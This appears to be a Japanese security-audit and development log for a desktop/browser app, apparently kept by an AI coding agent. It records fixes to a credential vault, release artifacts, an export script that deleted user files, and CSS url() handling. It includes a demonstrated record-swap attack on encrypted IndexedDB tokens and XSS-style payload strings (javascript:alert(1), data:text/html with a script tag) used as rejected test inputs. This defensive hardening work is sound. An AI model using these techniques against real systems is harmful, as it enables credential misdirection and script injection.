| `insertMany` の「全件か 0 件か」 | ✅ **本当に原子的** (トランザクションを開く前に暗号化を済ませている) |

### 禁止の型から「周りの文」を落とす —— 言い換えで抜けた自分の検査 (2026-08-23)

前項でキーチェーンの主張が言い換えで抜けたので、**自分が書いた
「〜と書いていないこと」型の検査**を全部数え直した。

#### まず 109 件を分類した

`not.toMatch` / `not.toContain` で日本語を見ている箇所は 109。
大半は**描画の検査**である (「アドバイザー結果が無ければその節を出さない」等)
—— 言い換えは製品の変更であり、対になる肯定側の検査が捕まえる。

危ないのは**安全性の主張の否定**だけ:

```
  storageClaims  キーチェーンの一文        ← 前項で主張の単位へ広げた
  storageClaims  Ollama の数字 (30 秒…)
  storageClaims  パスワード最小長
  cloudSyncClaims 未接続の文言
  backup         「SHA-256 で改ざん検知」  ← 元から選択肢つきの型
```

#### パスワード最小長で実測 —— 素通りした

`LockScreen` に**定数参照を残したまま**、別の言い回しで

```
  title="8文字以上で入力してください"
```

を足したら **22 件すべて通った**。保管庫が強制するのは 12 なので、
**画面だけが 8 と言う状態**に戻る —— このセッションで一度直した defect
そのものである。

検査は `placeholder="\d+ 文字以上"` と `パスワードは \d+ 文字以上` を
禁じていた。**周りの言い回しごと固定していた**ので、囲みが変われば抜ける。

#### 直し方 —— 誤りの本体だけを残す

誤りは「**長さを字面の数字で言っていること**」であって、その数字を囲む文
ではない。禁止の型を `\d+ 文字以上` だけに絞った。定数から描けば原文は
`${MIN_PASSWORD_LENGTH} 文字以上` になり、字面の数字は現れない。

精度を先に測った (コメントを落としてから):

```
  実物の renderer 全体で `\d+ 文字以上` の直書き → 1 件
     SecurityPage の「より長く (16文字以上)…」= 一般的な強度の助言
     → 対象を 2 つのパスワード画面に絞れば 誤検知 0
```

コメントを落とすのは、**直した経緯を書いた自分の注記**に当ててしまうため
(実際、素の走査では `SettingsPage` の注記の「8 文字以上」「12 文字以上」を
拾っていた)。

対照実験: 素通りした言い換えを再現すると、その文字列を名指しして落ちる。

> **禁止の型を書くときは、誤りの本体だけを残して周りの文を落とす。**
> 周りごと固定すると、言い換え 1 つで穴が開く。

### レコード暗号化には有効化する口が無い —— 診断の 45/100 が到達不能 (2026-08-23 実測)

`recordEncryption.ts` は engine として完成しており検査も厚い (有効化/解除/
アンロック・KCV 検証・順序・壊れたメタの保護)。**だが UI から呼ぶ経路が無い。**

```
  enableEncryption   … 呼び出し元 0 (テストのみ)
  unlockEncryption   … 呼び出し元 0 (テストのみ)
  disableEncryption  … 呼び出し元 0 (テストのみ)
  isEncryptionEnabled … dbPosture.ts と BackupPanel.tsx が読むだけ
```

`docs/DATA_PROTECTION.md` が「残りは設定 UI/起動時アンロック画面の配線のみ」と
書いているとおりで、**未配線であること自体は既知**。ここに書き足すのは
**その結果として診断画面に何が起きているか**の実測である。

#### 何が起きているか

`isEncryptionEnabled()` は本番では常に `false` になる。診断
(`buildDbSecurityReport`) はこの 1 つの値から **2 つの検査**を出しており、
重みの合計は **45 / 100**:

```
  encryption       critical  weight 30   ← isEncryptionEnabled()
  master-password  high      weight 15   ← 同じ値 (dbPosture が転記)
```

つまり **利用者が何をしても診断の点数は 55 点を超えない。** しかも
`encryption` の改善案は「**設定で**レコード暗号化を有効化し…」と、
**存在しない設定**を指している。

**直せない指摘を出し続ける診断は、読まれなくなる。** これは「鳴り続ける門は
見なくなる」と同じ形で、`lint:regex` に確認パスを足したときと同じ理由で悪い。

#### 直し方 (どちらも設計判断なので、決める人が決めること)

1. **配線する** —— 設定画面に有効化/解除/起動時アンロックを足す。engine は
   揃っているので、画面と「起動時にアンロックを促す」導線だけ。
   ただし**先に決めることがある**: 暗号化を有効にしたままのバックアップは
   他の端末で開けない (salt が localStorage にあり書き出しに入らない。
   同日の実測・`BackupPanel` に警告を出してある)。配線するなら、
   バックアップに salt/KCV を同梱するかを併せて決める必要がある。
2. **診断の側で「未提供」と「未達」を分ける** —— 利用者が取れない行動を
   減点に数えない。点数の意味は変わるので、こちらも設計判断。

**この 2 つを勝手に決めなかったので、実測だけ残す。**

#### 付随: いま入れてある備えは「配線された日」に効く

- `store.importAll` は平文で入ってきたレコードを現在の cipher で封緘する
  (同日修正)。**今は cipher が既定 = 平文なので観測できる差は無い**が、
  配線した瞬間から復元が保護を外さなくなる。
- `BackupPanel` の「暗号化が有効なら他の端末で開けない」警告は
  `isEncryptionEnabled()` を見るので、**現状は描画されない**。
  配線されたら出る。

### 不動産取得税の軽減税率に、期限が記録されていない (2026-08-23 実測・**出典が要る**)

`src/shared/taxRealEstateAcquisition.ts` の `REDUCED_RATE = 0.03` には、注記に
**「租税特別措置法 附則による特例」**と書いてある —— つまりモジュール自身が
**期限つきの措置だと知っている**。だが**期限がどこにも記録されていない**:

- モジュール内に日付なし
- `complianceKnowledge.ts` の「不動産取得税」項も軽減措置の存在は書くが**期限を書いていない**
  (`asOf: '2026-06'` / 総務省・東京都主税局・北海道の出典つき)

同日に `lint:rate-freshness` へ**期限つき措置の台帳**を足したので、日付さえ
記録されれば**登録は 1 行**で済む (`DATED_MEASURES` に `constName` を足すだけ。
門はコードの定数から日付を読む)。

#### なぜここで直さなかったか

**期限を私が書くと、出典のない数字になる。** このリポジトリの規則は
「推測で出典を直さない」で、2割特例のときは**既に出典つきで載っていた日付**を
機械が読める形に置き換えただけだった。こちらは出典が無いので同じことができない。

#### 直す人がやること

1. 総務省または都道府県税事務所の一次資料で、住宅・土地の軽減税率 3% の
   **適用期限**を確認する (延長が繰り返されている措置なので、**現在有効な期限**を見ること)
2. `complianceKnowledge.ts` の該当項に期限と出典を追記
3. `taxRealEstateAcquisition.ts` に `REDUCED_RATE_MEASURE_END = 'YYYY-MM-DD'` を置く
4. `scripts/lint-rate-freshness.cjs` の `DATED_MEASURES` に 1 件足す

#### 同時に確かめた範囲 (こちらは白)

- `taxStampDuty.ts` / `taxAutomobile.ts` —— どちらも注記のとおり**本則税率**を
  再現しており、期限つきの軽減措置を**わざと持っていない**。期限の問題が起きない作り。
- 知識データの `asOf` —— 2,321 件すべてが 0〜2 か月以内で、
  `knowledge-autopilot.cjs` が collection ごとの `STALE_MONTHS` (既定 12 か月) と
  比べて `reverify` 待ち行列を作る仕組みが**既にある**。追加の門は要らない。


---

### 全ジョブ緑のまま、公開物には前のランの残骸が残っていた (2026-08-24)

`release.yml` はこのセッションで唯一一度も読んでいなかったワークフローだった。
`fail_on_unmatched_files: false` にだけ**注釈が無い**のが目に留まったので調べた。

#### 実測 — v0.1.0 の公開物 (GitHub API)

| 資産 | 作成時刻 (UTC) | サイズ |
|---|---|---|
| `Service-Hub-0.1.0.AppImage` | **2026-07-27 07:56:30** | 131,952,302 B |
| `Service.Hub-0.1.0-arm64.dmg` | 2026-07-27 23:55:03 | 124,152,659 B |
| `Service.Hub-0.1.0-arm64.dmg.blockmap` | 2026-07-27 23:55:03 | 131,000 B |
| `Service.Hub-0.1.0.AppImage` | **2026-07-27 23:55:13** | 131,952,338 B |
| `service-hub-desktop_0.1.0_amd64.deb` | 2026-07-27 23:55:13 | 102,362,536 B |
| `Service.Hub.Setup.0.1.0.exe` | 2026-07-27 23:56:07 | 102,592,016 B |
| `Service.Hub.Setup.0.1.0.exe.blockmap` | 2026-07-27 23:56:07 | 107,620 B |

アップロードは **16 時間離れた 2 回**に分かれている。07:56 の 1 回目
(`release.yml` の注釈が「v0.1.0 の失敗ラン」と呼んでいるもの) が上げた
AppImage が**消されないまま今も公開されている**。

つまり利用者がリリースページで見るのは、**同じ版の AppImage が 2 本**、
36 バイトだけ違うサイズで、どちらが正規のビルドか区別する材料は無い、という状態である。
チェックサムも署名も無い。

`updateCheck.ts` の冒頭は「署名の無い配布物を自動取得しない」理由として
**「リリース資産が差し替えられた場合」**を挙げている。その懸念は正しいのに、
利用者が手で落とす側には**照合する手段が何も無い**。

#### なぜどの門も鳴らなかったか

1. `fail_on_unmatched_files: false` —— 配布物ゼロでも緑。ここだけ注釈が無い
2. `fail-fast: false` との組み合わせ —— 1 OS 欠けても他が緑なので気付けない
3. `true` へ倒しても足りない —— `files:` の glob は `release/*.dmg` で、
   `electron-builder.json` が `arch: ["x64","arm64"]` と宣言していても
   **arm64 だけで一致する**
4. `true` は危なくもある —— `release/*.dmg.blockmap` も並んでいて、
   blockmap は必ず出るとは限らない。**正しいリリースを赤にしうる**
5. そして 1〜4 のどれも、**前のランが残した資産**は見ていない

#### 入れた対策 — `scripts/verify-release-artifacts.cjs` (30 番目のゲート)

`electron-builder.json` の `target` / `arch` から「拡張子ごとに最低何本要るか」を
導き、`release/` の実物と突き合わせる。一覧を手で持たないので、target や arch を
足した日に自動で追随する。`nsis` だけ `perArch: false` —— 既定で全 arch を
1 本にまとめるので、一律 true にすると win を multi-arch にした日に
**正しいリリースが赤になる**。

- `release.yml` の Upload の**前**に置いた (RUNNER_OS は組み込み変数なので `${{ }}` 不要)
- 論理の self-test 17 件は `verify:all` / `ci.yml` に入れた
- 実物での確認: 現行 config + v0.1.0 の実際の出力 → **mac だけ赤**
  (x64 dmg を宣言しているのに arm64 しか無い)。空 → 3 OS とも赤。
  x64 を足す → 緑。`--dir` に絶対パスを渡すと `path.join` が REPO_ROOT に
  継ぎ足して「0 件」と誤報する不具合を、この確認で見つけて直した

#### 残っている作業 — **持ち主の判断が要る**

このゲートは「今回のランが何を出したか」しか見ない。**前のランの残骸は検出できない。**
公開済みの資産を消すのは外向きで取り消しにくい操作なので、こちらでは触っていない。

1. `Service-Hub-0.1.0.AppImage` (07:56 のもの) を v0.1.0 の資産から削除するか決める
   —— 残すなら、どちらが正規かリリースノートに書く必要がある
2. 配布物のチェックサム (SHA256SUMS) を公開するか決める。現状、利用者は
   131 MB のバイナリを**照合する手段なしに**実行している
3. 上の 2 つを決めたら、リリース後に「公開されている資産一覧が
   今回のランの出力と一致するか」を確かめる段を足せる (API 参照が要るので
   ローカルでは論理しか試せない)

---

### 書き出し先を「消してから書く」経路が、利用者の指定した場所を丸ごと消していた (2026-08-24)

`scripts/export-notebooklm.cjs` の 134 行目はこうだった:

```js
const OUT = process.env.OUT_DIR || path.join(os.tmpdir(), 'notebooklm-export');
…
fs.rmSync(OUT, { recursive: true, force: true });
```

**`OUT_DIR` は環境変数そのもの**で、しかもファイル冒頭の使い方が

```
OUT_DIR=/path/to/dir node scripts/export-notebooklm.cjs
```

と**利用者に場所を指定させている**。書き出し先に関連資料を置いている人が
そこを指すのは自然な使い方で、そのとき中身は**警告も確認もなく、
終了コード 0 のまま**消える。

#### 実測 (2026-08-24)

書き出し先に `原稿.md` と `私のメモ/資料.txt` を置いて実行した:

```
--- 実行後 ---  原稿.md → ★ 消えた
                私のメモ/資料.txt → ★ 消えた (ディレクトリごと)
✅ NotebookLM エクスポート: 23 ファイル / 12.9 MB
```

#### なぜ前の点検で見つからなかったか

2026-08-22 の点検はこのファイルを見ており、`docs/REMAINING_WORK.md` に
「書き出し名は `VOLUME_SPECS` 表の**定数** (`nn` / `slug`)。データ由来ではない」と
記録している。**その結論は正しい。** 見ていたのが**書く側の名前**で、
`safe-vault-write` が要るかどうかを判断していた。

見ていなかったのは**消す側の宛先**である。同じファイルの中に、
判定の対象になっていない破壊的な操作が 1 行あった。8 行隣の
`build-knowledge-vault.cjs` は「**消す前に確かめる**」を明示的にやっている
(しかも「先に rmSync すると 7500 件が失われた状態で止まる」という
実地の失敗つきで注記されている) のに、こちらには何も無かった。

#### 直し方 — 「自分が作ったものだけ消す」

`rmSync(OUT, {recursive:true})` をやめ、**この書き出しが作った名前だけ**を
消す形にした。古いパート (`p1of3` → `p1of2` で 1 つ余る) を残さないために
消す必要はあるので、消すこと自体はやめられない。

- `VOLUMES` を `VOLUME_SPECS` (定数のみ) と `buildVolumes()` (vault を読む) に分けた。
  名前の頭が**読み込みだけで確定する**ので、判定に vault が要らない
- `isOwnExport(name)` は巻の頭と完全一致するか `-p<数>of<数>` が続く形だけを
  自分のものと見なす。`\d\d-.+\.md` のような形にすると、利用者が置いた
  `01-はじめに.md` まで自分のものに見えてしまう
- **知らないものが 1 つでもあれば、何も消さずに断る** (終了コード 1)
- ドットファイル (`.DS_Store` など) は数にも入れないし消さない
- 名前は `exportFileName()` 1 本から出す —— 作る側と消す側が同じ関数を使う

あわせて、読み込むだけで書き出しと削除が走る形 (トップレベル文) を
`main()` + `require.main` に直した。これで検査から読める。

#### 対照 (2026-08-24 実測)

| 場面 | 結果 |
|---|---|
| 利用者のファイルが在る所を指す | **拒否・exit 1・1 つも消えない** |
| 空のディレクトリ | 23 ファイル書き出し |
| 存在しないディレクトリ (初回) | 作って 23 ファイル |
| 2 回目 (古いパート `p9of9` 混じり) | 前回の 24 件を消して 23 件を書き直し |
| 既定 (`OUT_DIR` 無し) | `/tmp/notebooklm-export` へ 23 ファイル |

検査は `src/shared/__tests__/notebooklmExportClear.test.ts` に 16 件。
読み取りと削除を差し替えられる形にしたので、実ファイルを消さずに
「断るときは 1 つも消さない」を直接留められる。ENOENT 以外の読み取り失敗を
握りつぶさないことも留めた (権限が無いだけの所を「空」と読むと、
そのまま書き出しに進んで別の失敗になる)。

---

### 認証付き暗号は「中身が正しい」しか言わない — 資格情報が置き場所ごと入れ替えられた (2026-08-24)

ブラウザ版の Credential Vault (`src/renderer/security/vault.ts`) は
AES-GCM-256 + PBKDF2-SHA-256 600k で、IV は暗号化のたびに新しく採り、
派生鍵は `extractable: false`、KCV で復号検証もしている。**核は堅い。**

見ていなかったのは、**暗号文がどこに置かれていたか**である。

#### 実証 (2026-08-24)

```
vault.initialize(PW)
vault.setToken('github', 'ghp_REAL_GITHUB_TOKEN')
vault.setToken('slack',  'xoxb-real-slack-token')

// 攻撃者: 復号はできないが、IndexedDB のレコードは移せる
put(tokens, 'slack', get(tokens, 'github'))

vault.unlock(PW)
vault.getToken('slack')  →  'ghp_REAL_GITHUB_TOKEN'   ★ 通った
```

AES-GCM は「暗号文が改竄されていないこと」を保証するが、
**それが `github` の欄に在ったのか `slack` の欄に在ったのか**は何も言わない。
IndexedDB へ書ける相手 (ブラウザプロファイルに触れる者・ページに script を
通せる者) は、**マスターパスワードを一切知らないまま、どの資格情報を
どのサービスへ送らせるかを選べる**。

ブラウザ版は CORS で塞がれた API の中継先を利用者が設定できる
(`network/proxy.ts`)。送り先まで攻撃者が選べる状況では、そのまま
持ち出しの経路になる。

#### なぜ 99 件の検査で捕まらなかったか

vault の検査は**暗号の正しさ**を測っていた —— 往復・鍵違い・KCV・
リカバリー・施錠競合。どれも「1 レコードの中で完結する」性質である。
**レコードとレコードの関係**を見る検査は 1 件も無かった。

#### 直し方 — `serviceId` を AAD で束ねる

`crypto.subtle.encrypt` の `additionalData` に
`service-hub-token-v1:<serviceId>` を渡す。置き場所が違えば
**復号自体が失敗する** (鍵違いと同じ扱いで `null` を返す)。

移行は 2 段:

- レコードに `v: 1` の印を付ける。`v === 1` なら AAD 必須で、**代替経路は無い**
  (印を剥がしても、暗号文は AAD つきなので旧経路では復号できない)
- 印の無い旧レコードは AAD 無しで読んだうえ、その場で束ね直す。
  さらに**解錠のたびに全件を束ね直す** —— 読み出し時だけの移行だと
  「一度も読まれないトークン」が旧形式のまま残り、
  **付け替え攻撃はまさにそれを狙える**

#### 検査 (`vaultRecordBinding.test.ts` 8 件)

本物の旧形式を作って移行経路を通している —— vault と同じ手順で
マスター鍵を取り出し (salt+iterations で PBKDF2 → `master-wrap` を復号)、
AAD 無しで暗号化して印を付けずに置く。**印を剥がすだけで済ませると
暗号文は AAD つきのままなので、旧経路を一度も通らない空撃ちになる。**

移行前の窓も**通ってしまう側として**留めてある (旧レコードは束縛が無いので
付け替えが通る → 一度読むか解錠すれば通らなくなる)。「直したつもりで
窓が残っている」を防ぐため。

対照: 束縛を両側から外すと 3 件が落ちる (`別サービスの位置へ移された
暗号文は復号できない` を含む)。

#### 同じ形を持つが**直していない**もの — `recordCipher.ts`

CRM レコードの field-level 暗号化 (`data` だけを封緘) も、レコード id で
束ねていない。直していない理由は 2 つ:

1. `RecordCipher.encrypt(data)` は id を受け取らない。束ねるには
   インタフェースを変える必要があり、`recordEncryption.ts` /
   `cloudProviderAdapter.ts` / `backup.ts` に波及する
2. **そもそも `decrypt` は封緘されていない平文を素通しする**
   (「暗号化を有効化する前のレコードも読める」ための意図的な後方互換)。
   つまりこの層は**改竄検知を目的にしていない**。束ねても、
   平文で書き換える経路が開いたままなら意味が薄い

対象も違う —— こちらは利用者自身のローカルレコードで、第三者へ送られる
資格情報ではない。**UI への結線も未完了** (45/100 が到達不能) なので、
「暗号化を本当に有効化するときに、id 束縛と平文素通しを同時に決める」
のが正しい順序と判断した。


---

### 保存値を読む 19 経路を「読み出し時に検証しているか」で洗った — 白 (2026-08-24)

0-a-21 (暗号文と置き場所の束縛) を入れた流れで、**保存された値を後から信じている
経路**を全部数えた。`localStorage.getItem` / `sessionStorage.getItem` は 19 件。

問いは 1 つ: **「保存時にしか検証していない値はあるか」**。
保存時だけだと、検証が緩かった頃の値や別経路 (devtools・拡張・プロファイルに
触れる者) で書かれた値がそのまま使われる。

| 経路 | 何を保存しているか | 判定 |
|---|---|---|
| `network/proxy.ts` | 中継先 URL (**送り先**) | ✅ `inspectStoredProxyConfig` が**読み出しのたびに**再検証。「保存はされているが今の規則では使えない」と画面に言える形まで在る |
| `network/ollamaWeb.ts` | Ollama の接続先 (**送り先**) | ✅ `loadEndpointSetting` は生値を返すが、**消費側 3 経路すべて**が `parseOllamaEndpoint` を通す (`probeOllama` / `chatOllama` / `OllamaPage`)。保存側は無検証だが、設計として正しい向き |
| `ChatbotWidget` のモデル名 | Ollama のモデル名 | ✅ `invoke('ollama','chat')` → `chatOllama` → `isSafeModelName`。main 側 (`clients/ollama.ts:238`) も同じ検証 |
| `data/recordEncryption.ts` | 暗号化メタ (salt / kcv) | ✅ 読み出し時に形を検証 (`enabled===true` / `typeof salt` / `isSealed(kcv)`)。**反復回数は保存していない** ので vault が踏んだ「メタ由来の反復回数」の穴が原理的に無い |
| `oauth/pkceSession.ts` | PKCE verifier | ✅ 2026-08-23 に点検済み (失敗時の掃除漏れを修正) |
| `GoogleConnectCard` / `Microsoft365Page` | OAuth の client_id | ✅ 認可 URL の**ホストは定数** (`https://accounts.google.com/...`)。client_id を利用者が持ち込むのはこの機能の設計そのもの |
| `stocksWatchlistWeb` | ティッカー | ✅ 2026-08-23 に 3 実装を `isSafeSymbol` へ寄せ済み |
| 残り (chat 履歴 / テーマ / 下書き / plan / license / emotions / docstudio) | 表示・下書き | 送り先にも実行にもならない |

**白だった。** 送り先を決める 2 経路がどちらも読み出し時検証で、しかも
`proxy.ts` には**なぜ保存時だけでは足りないか**が注記されている。

#### 併せて見た 2 つ (どちらも変更なし)

- **`cloud/cloudProviderAdapter.ts` の暗号文** — `sealWithKey(key, plaintext)` は
  保存先パスで束ねていないので 0-a-21 と同じ形。ただし **`CloudTransport` の
  実装が 1 つも無く**、`cloudProviderAdapter` を import する製品コードも無い
  (2026-08-22 に「成功をでっち上げていた」として点検・是正済みの領域)。
  マニフェスト側には `path → sha256` の対応と `verifyManifest` が既に在る。
  **ただし `actualShas` は省略可**で、省略すると構造だけ見て `ok:true` を返す ——
  送信路を実装する人が `verifyManifest(manifest)` だけ呼ぶと**中身を 1 件も
  照合しないまま緑になる**。実装時にここを決めること (今は呼び出し 0 件なので触らない)。
- **`library/` のプレビュー** — `blob:` を同一オリジンで開く経路は既に塞がれて
  いる (`window.open(blob:)` → data: URL の `<img>`)。SVG は `<img>` 経由なら
  secure static mode でスクリプトが動かず、text は JSX で本文として出るだけ。


---

### 保管庫は「このアカウントが Pages に置く全ページ」とオリジンを共有している (2026-08-24)

コードの穴ではなく**配信先の性質**。だが資格情報の置き場所の話なので記録する。

GitHub Pages のプロジェクトサイトは `https://<account>.github.io/<repo>/` に置かれる。
オリジンは scheme + host + port なので、このアカウントが Pages に公開する
**すべてのリポジトリが `https://hiroto1977.github.io` という 1 つのオリジンを共有する**。

ブラウザの保管領域はオリジン単位である。したがって:

| 置き場所 | 共有される範囲 |
|---|---|
| IndexedDB `business-hub-vault` (**資格情報**) | 同アカウントの Pages 全ページから開ける |
| IndexedDB (proxy 設定・ライブラリの実体) | 同上 |
| localStorage (Ollama 接続先・チャット履歴・下書き・plan) | 同上・**平文** |
| Cache Storage | 同上 |

つまり `https://hiroto1977.github.io/<別のリポジトリ>/` に置いたページは、
**このアプリの保管庫の IndexedDB を直接開ける**。

#### 何ができて、何ができないか

- **できない**: マスター鍵の取得。`extractable: false` のメモリ保持で、
  ディスクにも他オリジンにも出ない。暗号文を読んでも復号できない
- **できない**: Service Worker による横取り。SW のスコープは自分のパス配下に
  限られ (`Service-Worker-Allowed` を返さない Pages では広げられない)、
  `/別リポジトリ/` の SW が `/-/` の要求を捕まえることはない
- **できた**: **レコードの付け替え** —— まさに 2026-08-24 に実証・修正したもの。
  復号できなくても置き場所は動かせるので、資格情報の行き先を選べた。
  AAD 束縛を入れたので**今は通らない**
- **できる**: localStorage の平文設定の読み書き。送り先を決める 2 つ
  (proxy / Ollama 接続先) は**読み出し時に再検証している**ので、
  書き換えても許可外の宛先へは飛ばない (同日の一覧を参照)

#### 直し方 (持ち主の判断)

1. **カスタムドメインを当てる** —— オリジンが分かれるので、他の Pages と
   保管領域が完全に切れる。いちばん効く
2. このアカウントの Pages に**他のサイトを置かない**運用にする
3. 現状のまま受け入れる —— AAD 束縛と読み出し時検証が入ったので、
   「置き換えて送り先を選ぶ」経路は塞がっている

#### 確かめられなかったこと (正直に書く)

**今このオリジンに他に何が公開されているかは確認できていない。**
`hiroto1977.github.io` はこのセッションの送信ポリシーで許可されておらず
(プロキシが 403 を返す)、指示どおり迂回していない。判断には
「現在このアカウントの Pages に何が公開されているか」を持ち主が
見る必要がある。


---

### 予告されていた穴が、予告どおりに開いていた — CSS `url()` (2026-08-24)

`docs/SECURITY_AUDIT.md` の完了項目に、同じ軸 (0-a-20 —「✅ が答えたのは
そのとき立てた問いだけ」) を当てた。R3-6 を見て手が止まった。

> R3-6 `DataList.tsx`, `StatusBar.tsx` — 第三者由来 `thumbnailUrl`/`avatarUrl` の
> スキーム未検証 (現状 `<img>` なので実害なし。**`href`/CSS `url()`/SVG `use` へ
> 移した瞬間に危険**) → https?/data:image のみ許可 … **修正**

`safeImageSrc` の冒頭にも同じ予告が書いてある:

> ただし同じ値が将来 `<a href>` / **CSS `url()`** / SVG `<use href>` /
> `openExternal` に流れた瞬間に `javascript:` や `data:text/html` が
> 実行プリミティブになる。検証は描画箇所ごとではなく**値の入口**に置き、
> リファクタで守りが消えないようにする。

**その CSS `url()` が在り、関門を通っていなかった。**

```ts
// src/renderer/pages/AssistantPage.tsx:481 (直す前)
backgroundImage: theme.image ? `url(${theme.image})` : undefined,
```

#### 値の出どころ

`theme.image` は `localStorage['assistant-theme']` から来る。読み出しの検証は
`typeof p.image === 'string'` **だけ** —— スキームを見ていない。

localStorage は同一オリジンの誰でも書ける。同日に記録したとおり、Pages の
プロジェクトサイトは**同アカウントの全リポジトリで 1 オリジンを共有する**ので、
この値は「利用者が入力するもの」であると同時に「別ページや拡張が仕込めるもの」でもある。

#### 何が起きるか / 起きないか

- **起きない**: `javascript:` の実行。CSS の `url()` から javascript: は走らない
- **起きない**: CSS 注入。React は `style` を CSSOM 経由で代入するので、
  `;` を含む値は宣言ごと落ちる
- **起きる**: **任意の https URL を取りに行く**。出荷 CSP は
  `img-src 'self' data: blob: https:` でホストを絞っていないので、
  仕込まれた URL がビーコンになる (開いた時刻・IP・UA が相手に渡る)
- **起きる (機能の壊れ)**: `)` や空白を含む URL で宣言が壊れ、背景が黙って出ない。
  `https://example.com/a(b).png` は実在しうる形

R3-6 が「`<img>` なので実害なし」と書いたのは正しかった。だが**同じ値が
別の沈み先へ流れた**ときの話を予告しておきながら、その沈み先が生まれたことに
気付く仕組みは無かった。

#### 直し方 — 関門に**引用の作法まで**寄せる

`safeCssUrl()` を `DataList.tsx` に置いた (`safeImageSrc` の隣 = 値の入口)。
スキーム検証を通した値だけを**引用して**包む。引用が要る理由はスキームとは
別で、上の「機能の壊れ」を同時に塞ぐため。

```
  "https://example.com/a(b).png" → url("https://example.com/a(b).png")
  "https://example.com/a\".png"  → url("https://example.com/a\\\".png")
  "javascript:alert(1)"          → undefined
  "java<TAB>script:alert(1)"     → undefined
  "data:text/html,<script>x"     → undefined
```

#### 予告では止まらなかったので、字面で止める

`lint:forbidden` に 31 個目の規則を足した ——
**CSS の `url()` へ補間したら落ちる** (`url(${` / `url("${` / `url('${`)。
例外は関門自身の 1 行だけで、それも `KNOWN_SUPPRESSIONS` 台帳に理由つきで登録
(このゲートは台帳に無い例外が効いていると、それ自体を「新しい穴」として鳴らす)。

対照: 直す前の 1 行を戻すと `src/renderer/pages/AssistantPage.tsx:484` と
**名指しで**落ちる。自己テスト 5 件 (生補間 / 引用あり / 単引用は鳴る、
定数 `url(./icon.svg)` と補間なし `url(#gradient)` は鳴らない)。

#### 併せて確かめた同じ沈み先 (どちらも白)

- **`<a href>` 2 件** (`EligibilityChecker` の `j.sourceUrl` /
  `WelfareSchemeCard` の `src.url`) —— `onClick` が `preventDefault` して
  `openExternal` (http(s) allowlist) を通る。2026-08-23 の点検が
  「データ由来の URL が `openExternal` へ届く経路は 5 つ、どれも共有の
  `externalUrlGate` を通る」と数え、危険スキームの実在も 0 件と実測している。
  **ただしその点検が数えたのは `openExternal` への経路だった** ——
  CSS の沈み先は数の外に居た
- **`<img src={...}>` 2 件** —— どちらも `safeImageSrc` を通っている。取りこぼし無し


---

### `<script>` へ埋める側を全部数えた — 穴は無かったが、関門に検査が 1 件も無かった (2026-08-24)

R2-13 (「`JSON.stringify` を inline `<script>` に埋め、`<` 未エスケープ →
データに `</script>` が入るとページ崩壊」) に同じ軸を当てた。
対策は「書類メーカー3種 + landing」に入っている。**その後に生成器が増えている。**

#### 数えた — 8 本すべて覆われていた

| 生成器 | `<script>` に何を埋めるか | 退避 |
|---|---|---|
| `build-teikan-maker` / `build-shugyokisoku-maker` / `build-docs-studio` / `build-landing` | **JSON データ** | ✅ `jsonForScript` (共有) |
| `build-research-demo` / `build-deliberation-demo` / `build-counseling-demo` | **束ねた JS コード** | ✅ `</script` の退避 —— ただし**各ファイルに同じ 1 行が写されていた** |
| `build-integration-demo` | **静的な JS** (249 行・補間 0・バッククォート 0・`</script` 0) | 退避不要 (実測) |
| `src/main/clients/teamradar.ts` | —— | SVG に `<script>` を入れない旨の注記だけ |

**穴は無かった。** 数え間違いを 1 度している —— 最初 `grep '</script'` で
数えたら「退避は 0 本」と出た。退避側は `<\/script` と書くのでその字面では
当たらない。**測り方が間違っていた**ので数え直した。

#### だが関門そのものに検査が 1 件も無かった

`scripts/lib/json-for-script.cjs` は R2-13 の対策の本体で、生成器 4 本が
依存している。**検査は 0 件だった。** 壊れても気付けるのは公開してからになる。

検査 11 件を追加した。要は「**見た目だけ変えて意味を変えない**」ことなので、
`JSON.parse(jsonForScript(v))` が元の値と等しいことを直接留めている
(`<` は JSON の正規のエスケープなので、これは素直に書ける)。
`replaceToken` が `$&` / `` $` `` / `$1` を解釈しないことも留めた。

#### 写しを寄せたら、写しの側にバグが在った

3 本に写されていた `js.replace(/<\/script/gi, '<\\/script')` を
`scriptSafeJs()` として共有側へ寄せた。寄せる過程で気付いた:

```
  入力: var a = "</SCRIPT >";
  旧:   var a = "<\/script >";   ← ★ 中身が小文字に化ける
  新:   var a = "<\/SCRIPT >";
```

置換先を**小文字で固定**していたので、`</SCRIPT>` を含む文字列リテラルの
**実行時の値が変わっていた**。この関門の目的は「見た目だけ変えて意味を
変えない」ことなので、目的そのものに反していた。関数形の置換にして
一致した字面をそのまま戻す (ついでに文字列形 replace の `$&` 問題も避かる)。

現に化けるデータが在るかは別問題 (束ねるのは自前の TS)。**今は無害だが、
関門が自分の約束を破っている**ので直した。

#### 生成物で確かめた

3 本を再ビルドし、`<script` と `</script` の数が一致することを確認
(research 15.3 KB / deliberation 11.4 KB / counseling 16.9 KB、
それぞれの自己検証も OK)。

#### ゲートは作らなかった

「`<script>` へ補間したら共有関門を通せ」は grep で書きにくい ——
`inline-html.cjs` / `inject-pwa.cjs` は自前の検証を持つ正当な例外で、
生成器側も「データ」と「コード」で通す関門が違う。CSS `url()` の規則
(同日追加) と違って**実在の取りこぼしが 0 件**なので、
`escapeXml` のときと同じ判断で規則は作らず、写しを 1 つに寄せることで
「次の生成器が写し忘れる」形自体を無くした。


---

### `SECURITY_AUDIT.md` の残りの ✅ に同じ問いを当てた — 全部白 (2026-08-24)

CSS `url()` (同日) で当たった軸 ——「その ✅ が**数えなかった隣**はどこか」——
を残りの完了項目へ当てた。**変更なしの回。** 問うた内容を残す (0-a-20)。

| 項目 | その ✅ が答えた問い | 私が当てた問い | 結果 |
|---|---|---|---|
| R2-1 `app:openPath` / `revealInFolder` | この 2 つの口は封じ込められているか | **OS へ渡す口は他に無いか** | ✅ 6 か所すべて関門つき (`openExternal` ×3・`showItemInFolder`・`openPath`・権限ハンドラ)。`child_process` は `src/` に 0 件 (`lint:forbidden`) |
| R2-10 `tokenUrl` の https 未検証 | **tokenUrl** は https か | **authorizeUrl はどうか** (ブラウザを開く副作用がある分こちらが重い) | ✅ 既に `assertHttpsEndpoint(config.authorizeUrl, 'authorization')` が在り、しかも**ブラウザを開く前**に置いてある。10 件の authorizeUrl はすべて定数 (テナント毎に変わるホストは 1 件も無い) |
| R2-11 自己記述 `iterations` の上限 | `dataCrypto` の bundle は clamp されるか | **保存物から iterations を読む所は他に無いか** | ✅ 2/2。`dataCrypto:163` と `vault:532`、どちらも `deriveKey` の直前に `assertKdfIterations`。リカバリー枝は定数を使うので対象外 |
